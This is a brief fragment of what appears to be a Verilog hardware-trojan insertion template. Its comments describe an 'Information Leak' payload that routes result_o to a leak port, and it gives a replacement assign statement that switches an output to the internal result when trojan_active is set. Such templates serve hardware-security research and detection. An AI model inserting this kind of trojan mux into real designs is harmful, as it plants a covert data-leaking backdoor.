 ...
 * Payload: Route result_o to leak port
 * 
...
// ============================================================
// Information Leak: Route result_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? result_o : normal_value;